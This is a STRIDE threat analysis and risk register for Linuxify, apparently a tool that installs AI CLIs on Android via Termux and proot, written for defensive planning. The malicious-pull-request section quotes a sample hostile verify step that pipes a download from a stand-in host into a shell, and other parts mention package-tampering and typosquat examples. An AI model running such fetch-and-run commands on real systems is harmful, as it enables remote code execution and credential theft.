# Threat Analysis

> Audience: Linuxify maintainers, security researchers, and the AI coding agents implementing defensive controls. This document applies the **STRIDE** methodology (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) to enumerate threats against Linuxify and its components. The companion [security model](./security-model.md) defines the trust boundaries and mitigations in general terms; this document is the per-threat enumeration and risk register.

Threat analysis is the practice of looking at a system and asking, systematically, "what could go wrong, who would want it to go wrong, and what would the impact be?" For Linuxify the practice is especially important because the system sits at the intersection of three high-trust contexts: the user's personal device (an Android phone with access to contacts, messages, and authentication tokens), the user's developer workflow (CLIs that handle source code, SSH keys, and API credentials), and an open-source registry (which any contributor can propose changes to). A threat that exploits any one of these contexts can compromise the others. The STRIDE methodology is used here because it covers the six categories of threat that map cleanly to the properties a security-conscious user cares about: authenticity, integrity, non-repudiability, confidentiality, availability, and authorization.

---

## 1. Methodology

STRIDE categorizes threats into six types: **Spoofing** (claiming a false identity), **Tampering** (modifying data or code), **Repudiation** (denying an action), **Information Disclosure** (leaking data to unauthorized parties), **Denial of Service** (degrading or blocking a service), and **Elevation of Privilege** (gaining capabilities beyond what was granted). For each component in the Linuxify architecture — the CLI core, the registry, the package definitions, the patcher, the launcher, the proot runtime, the bootstrap, the user config, the CI/CD pipeline, and the maintainer accounts — we enumerate threats per category and pair each with a mitigation.

The output of the analysis is a **risk register** (§13) listing each threat with its likelihood (Low/Medium/High), impact (Low/Medium/High/Critical), mitigation, residual risk, and owner. The register is reviewed annually in full, with a threat-model delta produced at each release (§14) to capture new threats and re-evaluate existing ones. The analysis is grounded in the trust boundaries defined in [security-model](./security-model.md) §2 — threats that cross a trust boundary are higher-priority than threats that stay within one, because the boundary is where the system's defensive controls are concentrated.

A note on scope: this analysis covers *intentional* threats (an attacker actively trying to compromise the system) and *accidental* threats (a well-meaning contributor introducing a bug that has security impact). The two are treated the same way in the risk register because the user's experience is the same — a compromised CLI is a compromised CLI whether it was compromised by malice or by mistake. The difference is in the mitigation: intentional threats are mitigated by trust verification (signatures, reviews); accidental threats are mitigated by automated checks (linters, schema validators, fuzzing).

---

## 2. Asset Inventory

Before enumerating threats, we list what we are protecting. The assets, in roughly decreasing order of value:

- **User's files on the Android device** — photos, contacts, messages, app data accessible to Termux. The highest-value asset; compromise is catastrophic for the user.
- **User's API keys and tokens** — credentials for AI CLIs (OpenAI, Anthropic, etc.), git hosting (GitHub, GitLab), cloud providers (AWS, GCP). Stored in `~/.linuxify/config.toml` or in env vars. Compromise is financially and operationally damaging.
- **User's source code** — for developer users, the codebases they work on with Linuxify-installed CLIs. Compromise (exfiltration, backdooring) is damaging to the user's employer and to open-source downstream consumers.
- **Linuxify's reputation** — a single high-profile security incident (e.g., "Linuxify installed a backdoor into Cline that exfiltrated SSH keys") would destroy user trust and likely end the project. This is a project-existential asset.
- **Registry integrity** — the canonical package definitions, patch library, and compat-db. Compromise affects every user who runs `linuxify update`.
- **Package integrity** — the installed CLIs on a user's device, as delivered from upstream and patched by Linuxify. Compromise affects the user's workflow and any code the CLI touches.
- **Bootstrap integrity** — the proot rootfs, installed runtimes, and PATH configuration. Compromise gives an attacker a foothold that persists across CLI reinstalls.

The asset inventory is the input to the threat analysis: every threat in the register is paired with the asset(s) it threatens, so the residual risk can be evaluated in terms of asset value. A threat to the user's files is treated more seriously than a threat to the registry's metadata, even if both are rated "Medium likelihood," because the impact differs by an order of magnitude.

---

## 3. Threats: Spoofing

Spoofing threats involve an attacker claiming a false identity to gain trust they should not have. Linuxify has four spoofing surfaces.

**Spoofed registry (MITM on `git fetch`).** An attacker positioned between the user's device and the registry's git host (GitHub, currently) intercepts the fetch and serves a tampered registry. *Mitigation:* signed commits (every commit GPG-signed by a maintainer; the user's local clone is configured with `merge.verify-signatures = true`), HTTPS for the transport (so the MITM cannot read or modify the stream without a valid cert), and the registry's branch protection (so even a successful MITM cannot inject a malicious commit without a valid signature). *Residual risk:* Low — the only way to spoof the registry without a valid signature is to compromise a maintainer key (see below) or to compromise the user's local `KEYS` file.

**Spoofed mirror.** An attacker operates a mirror that serves a tampered registry. *Mitigation:* per-mirror trust (the user must explicitly trust a mirror before it is used; untrusted mirrors' commits are verified against the signed-commits chain exactly as for the primary registry), and the same commit-signing verification applies. *Residual risk:* Low, *if* the user understands the trust model. A user who blindly trusts any mirror is exposed; the documentation explicitly warns against this.

**Spoofed maintainer (key compromise).** An attacker compromises a maintainer's GPG key (via phishing, malware on the maintainer's machine, or weak passphrase) and uses it to sign malicious registry commits. *Mitigation:* 2-of-3 signing for sensitive operations (key rotation, releases — though single-maintainer signing is allowed for ordinary registry updates to keep the project agile), 2FA on the maintainer's GitHub account, hardware-backed GPG keys (YubiKey) where the maintainer has one, and the 2-of-3 key-rotation procedure for revoking a compromised key. *Residual risk:* Medium — a sophisticated attacker who compromises a maintainer's machine can intercept the 2FA and use the hardware key while it is unlocked. This is the highest-likelihood path to a malicious registry commit.

**Spoofed upstream package (typosquatting on npm).** An attacker publishes a typosquatted npm package (e.g., `cllne` instead of `cline`) and waits for a user to typo it. *Mitigation:* registry maintainer review (the registry entry for `cline` explicitly references `npm install -g cline`, so the user never types the package name; if they do `linuxify add cllne`, the registry lookup fails because no such package is defined), and package-name rules (the registry rejects packages whose names are typosquats of existing entries, enforced by a Levenshtein-distance check at PR review time). *Residual risk:* Low for users who only install via `linuxify add <name>`; Medium for users who manually edit the registry or install packages not in the registry.

---

## 4. Threats: Tampering

Tampering threats involve an attacker modifying data or code in transit or at rest. Linuxify has five tampering surfaces.

**Tampered package YAML in the registry.** An attacker modifies a package's YAML (e.g., changes the `install:` step to `npm install -g evil-package`) via a compromised maintainer account or a direct repository compromise. *Mitigation:* signed commits (the tampered YAML cannot be merged without a valid signature), PR review (two maintainer reviews required for `packages/*.yml` per [security-model](./security-model.md) §7), and CI lint (the schema validator and the `verify:`-command linter run on every PR). *Residual risk:* Low for direct repository compromise; Medium for compromised-maintainer compromise (same as §3).

**Tampered patch definitions.** An attacker modifies a patch's `find`/`replace` or `ast`/`replace` to insert a backdoor. *Mitigation:* same as above (signed commits, PR review, CI lint), plus the patch `verify:`-command linter (which blocks dangerous `verify:` commands like `curl | sh`), plus the user-facing patch-diff display at install time (the user can spot a suspicious patch even if it slipped through review). *Residual risk:* Low — the multi-layer defense makes a successful patch tamper hard to land without detection.

**Tampered bootstrap rootfs.** An attacker modifies the Ubuntu rootfs that `linuxify init` downloads (e.g., adds a backdoored `bash` binary). *Mitigation:* SHA-256 verification (the registry entry for the rootfs includes its expected SHA-256; Linuxify verifies before extracting), and signed rootfs (future work — see [security-model](./security-model.md) §16). *Residual risk:* Medium in v1 — the SHA-256 protects against mirror tampering but not against a compromise of the upstream Ubuntu image hosting; signed rootfs in v2 closes this gap.

**Tampered local state.** An attacker with write access to `~/.linuxify/state.json` modifies it (e.g., marks a package as installed when it is not, to confuse a subsequent `linuxify doctor`). *Mitigation:* not much — local user can do anything; we trust local state. The `~/.linuxify/` directory is mode `0700` (so other Termux apps cannot write to it without Termux-level compromise), and Linuxify validates state.json's schema on every read (so a structurally-invalid state is detected), but a structurally-valid but semantically-malicious state is not detectable. *Residual risk:* accepted — if an attacker has write access to the user's home directory, Linuxify is the least of the user's problems.

**Tampered launchers.** An attacker modifies a launcher script at `$PREFIX/bin/cline` to inject code that runs before the CLI. *Mitigation:* launchers are regenerated by `linuxify repair launchers`; mismatch detection (Linuxify stores the expected launcher contents in `~/.linuxify/launchers/<name>.expected` and compares at `linuxify doctor` time; a mismatch is reported as `E_LAUNCHER_MISMATCH` and the user is advised to run `linuxify repair launchers`). *Residual risk:* Low for accidental modification; Medium for malicious modification by an attacker who has Termux-level access (the launcher can be tampered, but `doctor` will detect it on the next run).

---

## 5. Threats: Repudiation

Repudiation threats involve an attacker (or a legitimate user) denying an action they took. Linuxify has two repudiation surfaces.

**User denies installing a malicious package.** A user installs a package, observes a problem, and reports "I never installed this — Linuxify must have installed it without my consent." *Mitigation:* install log at `~/.linuxify/logs/install-<pkg>-<timestamp>.log` — every `linuxify add` writes a log entry with the timestamp, the package name, the source (registry or `--local`), the user's confirmed-or-not status, and the patch-diff display output. The log is append-only and is preserved across `linuxify remove` (so the user can audit past installs). *Residual risk:* Low — the log provides a clear audit trail; a user who denies installing a package can be shown the log.

**Maintainer denies merging a bad YAML.** A maintainer merges a PR that introduces a malicious patch and later claims they never reviewed it. *Mitigation:* signed commits (every merge commit is GPG-signed by the maintainer who merged it; the signature is non-repudiable assuming the key is not compromised), and GitHub's audit trail (the PR's review history is preserved and visible to all maintainers). *Residual risk:* Low — the combination of signed commits and the review audit trail makes denial difficult; a maintainer who claims they were coerced or socially engineered into merging is a different (and harder) problem.

---

## 6. Threats: Information Disclosure

Information disclosure threats involve data leaking to parties who should not see it. Linuxify has four disclosure surfaces.

**Secrets in logs.** A user's API key (e.g., `OPENAI_API_KEY=sk-...`) ends up in `~/.linuxify/logs/linuxify.log` because a command echoed the environment. *Mitigation:* redaction filter in the logger (see [security-model](./security-model.md) §9) — every log line is scanned for patterns matching known secret formats and any matches are replaced with `<redacted>`. The redaction patterns include `Authorization: Bearer`, env vars matching `*TOKEN*`, `*SECRET*`, `*KEY*`, `*PASSWORD*`, and the patterns are documented and part of the public API. *Residual risk:* Low for known patterns; Medium for unknown patterns (a secret whose format does not match any known pattern would not be redacted). The mitigation for the residual risk is user education: secrets should go in `~/.linuxify/config.toml` (which is never logged) rather than in env vars.

**Telemetry leaks.** Opt-in telemetry (off by default per PRD FR-052) includes command invocations, doctor results, and timing data — if not properly anonymized, this could reveal sensitive information (e.g., the names of the packages a user has installed, which could be sensitive in a corporate environment). *Mitigation:* opt-in (off by default; prompted on first run), anonymized (no machine IDs, no IP addresses retained beyond the request log, no package names beyond what is in the public registry), no secret fields (telemetry events are filtered through the same redaction as logs). *Residual risk:* Low — see [telemetry-privacy](../24-telemetry/telemetry-privacy.md) for the full data-handling contract.

**Doctor output leaked in a GitHub issue.** A user runs `linuxify doctor --markdown` and pastes the output into a public GitHub issue, inadvertently exposing their environment variables (which may contain tokens). *Mitigation:* doctor redacts known-secret env vars (using the same redaction patterns as the logger), and the doctor output includes a prominent warning before any environment-variable section: *"This output will be pasted into a public issue. Review the following lines for any sensitive data before posting."* The user is also offered `linuxify doctor --markdown --strict-redact` for a more aggressive redaction pass. *Residual risk:* Low for users who read the warning; Medium for users who paste without reading (a population that no amount of tooling can fully protect).

**proot filesystem escape.** A CLI running inside proot reads files outside its intended scope (e.g., reads the user's `~/.ssh/` directory). *Mitigation:* not really — proot is not a sandbox (see [security-model](./security-model.md) §15). The CLI has the same filesystem access as the Termux user. The only mitigation is to *not install* CLIs you do not trust, and to use Android's per-app sandboxing (Termux's storage permission can be revoked; the user can run Linuxify in a separate Termux installation with no storage access). *Residual risk:* High — this is the largest accepted risk in the v1 model, and the future-work plan (sandboxing via landlock, §16) is the long-term mitigation.

---

## 7. Threats: Denial of Service

Denial of service threats involve degrading or blocking a service. Linuxify has four DoS surfaces.

**Registry unavailable.** The primary registry (GitHub) is unavailable due to network outage, rate-limiting, or attack. *Mitigation:* mirror fallback (the user can configure one or more mirrors in `config.toml`; if the primary is unreachable, Linuxify tries the mirrors in order), local cache (every successfully-fetched registry update is cached in `~/.linuxify/cache/registry/`; on a registry miss, Linuxify uses the cached version with a warning), and offline mode (`--offline` flag refuses all network calls and uses only the cache). *Residual risk:* Low — the user can always work offline if they have cached the registry and the packages they need.

**Disk exhaustion.** A package install or a self-update fills the user's disk. *Mitigation:* storage budget checks (Linuxify checks available disk space before any large write — install, self-update, bootstrap — and aborts with error code `E_STORAGE_INSUFFICIENT` if the operation would leave less than 1GB free), garbage collection (`linuxify gc` removes orphaned package files, old cache entries, and old logs), and prune (`linuxify prune --dry-run` shows what would be removed; `linuxify prune` removes it). *Residual risk:* Low for normal operation; Medium for users with very tight storage (e.g., a 16GB phone) where even normal operation may be tight.

**CPU exhaustion by malicious patch.** A patch's regex is crafted to be a catastrophic-backtracking bomb (e.g., `(a+)+$` against a long string of `a`s), hanging the patcher for hours. *Mitigation:* patch regex timeout (every regex execution is wrapped in a 250ms timeout via `worker_threads`; a regex that exceeds the timeout is treated as a non-match and an `E_PATCH_REGEX_TIMEOUT` error is logged — see [testing-strategy](../12-testing/testing-strategy.md) §9). *Residual risk:* Low — the timeout is enforced by the worker-thread mechanism and cannot be bypassed by the regex itself.

**Memory exhaustion by large package.** A package install (e.g., a CLI with a 2GB `node_modules`) exhausts the user's memory. *Mitigation:* install size check before apply (the registry entry declares the package's approximate install size; Linuxify checks available memory before starting the install and aborts if the install would exceed a configurable threshold, default 75% of available RAM). *Residual risk:* Low for declared sizes; Medium for undeclared sizes (a package whose YAML omits the install-size field skips the check) — the schema validator should make the field mandatory in a future schema revision.

---

## 8. Threats: Elevation of Privilege

Elevation of privilege threats involve an attacker gaining capabilities beyond what they were granted. Linuxify has three elevation surfaces.

**Plugin privilege escalation.** A plugin attempts to escalate privileges (e.g., tries to write to `/system`, tries to install a setuid binary). *Mitigation:* plugins run as the Termux user, no escalation is possible — Termux has no privilege separation, and Android's security model prevents any Termux process from gaining system privileges regardless of what the plugin tries. *Residual risk:* None for system-level escalation; Medium for *Linuxify-level* escalation (a plugin could modify `~/.linuxify/config.toml` to add itself to the auto-load list, for example — the v2 capability-based system addresses this).

**Exploit in Linuxify core.** An attacker finds a vulnerability in Linuxify itself (e.g., a command-injection bug in the launcher generation) and uses it to run arbitrary code with Termux-user privileges. *Mitigation:* input validation (all user input is validated against schemas; see [security-model](./security-model.md) §14), no `eval` (forbidden by ESLint rule), no `child_process.exec` (forbidden; `execFile` and `spawn` with `shell: false` are used instead — preventing shell injection), and the contributor security checklist (§14 of the security model). *Residual risk:* Low — the controls are defense-in-depth and any single bypass does not directly yield code execution; a sophisticated attacker would need to chain multiple bypasses.

**proot exploit.** An attacker exploits a vulnerability in proot itself (proot is a complex piece of software that uses `ptrace` and is historically a source of security bugs) to escape the proot "container" and run code in the Termux process. *Mitigation:* none — proot itself is trusted; bugs in proot are upstream's problem (and are tracked at the proot repository). Linuxify does not attempt to defend against proot exploits because proot is not a security boundary (see [security-model](./security-model.md) §15) — there is nothing to "escape" because proot does not restrict filesystem or network access in the first place. *Residual risk:* accepted — a proot exploit is a Termux-wide problem, not a Linuxify-specific one.

---

## 9. Threat: Malicious CLI Upstream

This is the highest-likelihood, highest-impact threat to the Linuxify user base, and it deserves a dedicated scenario. The scenario: a popular AI CLI that Linuxify supports (say, `cline`) is compromised — either its npm package is hijacked, or its maintainer's account is taken over, or a malicious version is published and not detected for hours. The compromised version exfiltrates the user's SSH keys, AWS credentials, and source code to an attacker-controlled server.

Linuxify's exposure: it ran the compromised CLI inside proot, which has full access to the user's Termux-home files. The CLI reads `~/.ssh/`, `~/.aws/`, `~/.linuxify/config.toml` (where the user may have stored API keys for the CLI itself), and any source code the user has cloned into their Termux home. Linuxify's patch was applied (the patch is a benign compatibility fix; it does not affect the malicious behavior), the launcher worked as designed, and the CLI ran with all the privileges of the Termux user. From the user's perspective, Linuxify *facilitated* the compromise — it made it easier to install the compromised CLI than it would have been without Linuxify.

*Mitigation:* limited — this is the same exposure as running any CLI in Termux directly, and Linuxify does not make it worse (it makes it easier to install, but the install convenience is the point of Linuxify). The mitigations are: (a) the registry's `checksum:` field catches *mirror* tampering but not upstream compromise (the checksum is recorded from the upstream registry at registration time, so a compromised upstream package whose checksum is updated by an attacker is not detected — see §4 of the security model); (b) the user is warned at install time about experimental packages and packages with `permissions.network: false`; (c) the doctor output aggregated via telemetry can detect anomalous CLI behavior in the wild (e.g., if many users report `cline` failing or behaving oddly after a specific version, the compat matrix's automated detection picks it up). *Future:* per-package filesystem restrictions (a `linuxify run --sandbox cline` that restricts `cline`'s filesystem access to a specific directory, blocking access to `~/.ssh/` and `~/.aws/`), and runtime monitoring (a Linuxify-managed audit log of what files each CLI accessed, for post-incident forensics). These are v2+ work — see [security-model](./security-model.md) §16.

---

## 10. Threat: Compromised Maintainer

A Linuxify maintainer's GitHub account or GPG key is compromised. The attacker uses the compromised credentials to push a malicious commit to the registry (e.g., a patch that adds a backdoor to a popular CLI). The commit is signed with the compromised key, so the signature-verification check passes.

*Mitigation:* 2FA is required on all maintainer GitHub accounts (so compromising the password alone is not enough; the attacker also needs the 2FA second factor). Signed commits are required (so the attacker also needs the GPG key, which is stored on a hardware token if the maintainer has one). 2-of-N signing is required for releases (so a single compromised maintainer cannot ship a malicious release — at least two maintainers must sign). The 2-of-3 key-rotation procedure (§7 of the security model) allows the remaining maintainers to revoke the compromised key. PR review (two maintainer reviews for `packages/*.yml`) means a single compromised maintainer cannot merge a malicious YAML without a second compromised maintainer — the attacker would need to compromise two maintainers simultaneously, which is significantly harder.

*Residual risk:* Medium. A sophisticated attacker who compromises a maintainer's machine (rather than just their credentials) can intercept the 2FA and use the hardware token while it is unlocked. The mitigation is the 2-of-3 release-signing requirement (so the attacker cannot ship a malicious release without a second compromised maintainer) and the annual key-rotation rehearsal (so the revocation procedure is practiced and fast). The post-compromise recovery is described in [security-model](./security-model.md) §13: emergency revert of the malicious commit, advisory, key rotation, audit.

---

## 11. Threat: Compromised CI

A GitHub Actions runner is compromised (e.g., via a malicious action in the workflow, a compromised secret, or a vulnerability in the runner image). The attacker uses the compromised runner to publish a malicious release artifact (signed with the release-signing key, if the runner has access to it) or to inject malicious code into the build.

*Mitigation:* pin actions by SHA (not by tag) — a tag can be moved by anyone with write access to the action's repo; a SHA cannot. Minimal permissions — each workflow declares a `permissions:` block with only the capabilities it needs; the release workflow's `GITHUB_TOKEN` has no publish access (publishing is done by a separate, manually-triggered workflow). Ephemeral runners — GitHub-hosted runners are fresh VMs for each job; a compromise of one job does not persist to the next. Signed release artifacts — the release artifacts are signed by a GPG key that is *not* stored in GitHub Actions (it is held by a maintainer on a hardware token and applied by the maintainer after the artifacts are built); a compromised runner can produce unsigned or wrongly-signed artifacts but cannot produce correctly-signed ones. *Residual risk:* Low for direct artifact compromise; Medium for build-pipeline compromise (an attacker who can inject code into the build can produce a malicious-but-correctly-signed artifact if they also compromise the signing maintainer — a two-stage attack).

---

## 12. Threat: Malicious Pull Request

A contributor opens a PR that contains a malicious patch with `verify: curl evil.com | sh`. The PR is otherwise plausible (e.g., it adds support for a new CLI, the install steps look reasonable, the patches look reasonable, only the `verify:` command is malicious). The contributor hopes that a maintainer will merge it without carefully reading the `verify:` command.

*Mitigation:* CI lint blocks dangerous `verify:` commands (the `verify:`-command linter, described in [security-model](./security-model.md) §5, runs on every PR and rejects any `verify:` command outside the safe subset — `grep`, `test`, `[`, `head`, `tail`, `wc`, `cat`, `stat`, `file`, and shell builtins). The PR fails CI with a clear error: *"verify command 'curl evil.com | sh' uses forbidden command 'curl'; allowed commands are: grep, test, ..."*. Maintainer review is the second layer — even if the linter has a bug (e.g., a `curl` invocation obfuscated enough to bypass the linter), a careful reviewer should spot a `curl | sh` in a `verify:` field. The review checklist for PRs touching `packages/*.yml` explicitly asks: "Are all `verify:` commands in the safe subset? Do any of them make network calls? Do any of them write to files outside the package directory?"

*Residual risk:* Low — the linter is the primary defense and is robust against simple obfuscation; the review is the second layer. A sophisticated attacker who finds a linter bypass (e.g., a shell expansion that the linter's parser does not handle) could land a malicious `verify:` command, but the review would still catch anything that looks suspicious. The combination is defense-in-depth.

---

## 13. Risk Register

The risk register consolidates the threats above into a single table, rated by likelihood (L/M/H), impact (L/M/H/Critical), mitigation, and residual risk. The owner is the maintainer responsible for tracking the threat and ensuring the mitigation remains effective.

| # | Threat | Likelihood | Impact | Mitigation | Residual | Owner |
|---|--------|-----------|--------|------------|----------|-------|
| 1 | Spoofed registry (MITM on git fetch) | Low | Critical | Signed commits, HTTPS | Low | Registry lead |
| 2 | Spoofed mirror | Low | High | Per-mirror trust, signature verify | Low | Registry lead |
| 3 | Spoofed maintainer (key compromise) | Medium | Critical | 2FA, hardware keys, 2-of-3 rotation | Medium | Security lead |
| 4 | Spoofed upstream (typosquat) | Low | High | Registry review, name rules | Low | Registry lead |
| 5 | Tampered package YAML | Low | Critical | Signed commits, 2 reviews, CI lint | Low | Registry lead |
| 6 | Tampered patch definition | Low | Critical | Same as #5 + verify linter + user diff display | Low | Patcher lead |
| 7 | Tampered bootstrap rootfs | Medium | High | SHA-256 verify; signed rootfs (v2) | Medium | Bootstrap lead |
| 8 | Tampered local state | Medium | Medium | Mode 0700; schema validate | Accepted | — |
| 9 | Tampered launchers | Medium | High | Mismatch detection, `repair launchers` | Low | Launcher lead |
| 10 | Repudiation: user denies install | Low | Low | Install log | Low | — |
| 11 | Repudiation: maintainer denies merge | Low | Medium | Signed commits, audit trail | Low | — |
| 12 | Secrets in logs | Medium | High | Redaction filter | Low (known patterns), Medium (unknown) | Security lead |
| 13 | Telemetry leaks | Low | High | Opt-in, anonymized, no secret fields | Low | Telemetry lead |
| 14 | Doctor output leaked in issue | Medium | High | Redaction, warning, `--strict-redact` | Low (careful users), Medium (others) | Security lead |
| 15 | proot filesystem escape | High | Critical | None in v1; sandboxing in v2 | Accepted | Security lead |
| 16 | Registry unavailable | Medium | Medium | Mirrors, cache, offline mode | Low | Registry lead |
| 17 | Disk exhaustion | Low | Medium | Budget checks, GC, prune | Low | — |
| 18 | CPU exhaustion (regex bomb) | Low | Medium | Regex timeout (250ms) | Low | Patcher lead |
| 19 | Memory exhaustion (large package) | Low | Medium | Install size check | Low (declared), Medium (undeclared) | — |
| 20 | Plugin privilege escalation | Low | High | Plugins run as user; no system escalation | Medium (Linuxify-level) | Plugin lead |
| 21 | Exploit in Linuxify core | Low | Critical | Input validation, no eval, no shell exec | Low | Security lead |
| 22 | proot exploit | Low | High | None — proot not a sandbox | Accepted | — |
| 23 | Malicious CLI upstream | High | Critical | Limited; checksum catches mirror only; v2 sandboxing | Accepted (v1), Medium (v2) | Security lead |
| 24 | Compromised maintainer | Medium | Critical | 2FA, hardware keys, 2-of-N signing, review | Medium | Security lead |
| 25 | Compromised CI | Low | Critical | Pinned actions, minimal perms, signed artifacts | Low | CI lead |
| 26 | Malicious PR with bad `verify:` | Medium | High | CI linter, maintainer review | Low | Patcher lead |

The register is sorted roughly by residual risk: the highest-residual threats (#15 proot escape, #23 malicious CLI upstream, #24 compromised maintainer) are the ones that drive the future-work roadmap in [security-model](./security-model.md) §16. The "Accepted" residual risks are explicit acknowledgments that v1 cannot fully mitigate; the v2 plan addresses each.

---

## 14. Security Review Cadence

Threat analysis is not a one-time exercise; it is a recurring practice. The review cadence is:

- **Annual full review** — the entire threat analysis is re-examined by the maintainer team. New threats (driven by changes in the threat landscape, new features in Linuxify, or new attack techniques observed in the wild) are added; obsolete threats are removed; mitigations are re-evaluated for effectiveness. The annual review produces a new version of this document and a delta summary listing what changed.
- **Quarterly dependency audit** — `npm audit`, `osv-scanner`, and a custom scanner for `packages/*.yml` upstream advisories are run; results are triaged and acted on within the quarter. The audit is the input to the dependency-update PRs that Dependabot opens.
- **Monthly patch library audit** — every patch in every `packages/*.yml` is re-read by a maintainer (rotating assignment) to confirm the patch is still necessary (the upstream CLI may have fixed the issue) and still safe (the upstream CLI's code may have changed in a way that makes the patch dangerous). Stale patches are removed; outdated patches are updated.
- **Per-release threat-model delta** — for every release (including patch releases), the maintainer producing the release writes a short delta document: "What new threats does this release introduce? What existing threats does it mitigate? Are there any threats in the register whose likelihood or impact has changed?" The delta is filed alongside the release notes and feeds into the next annual review.

The cadence is the input to the prioritization of the future-work roadmap in [security-model](./security-model.md) §16. A threat that emerges (e.g., a new class of attack on proot, a new supply-chain incident in the npm ecosystem) may reorder the priorities; the quarterly and annual reviews are the formal occasions for that reordering, but ad-hoc re-prioritization can happen at any maintainer meeting.
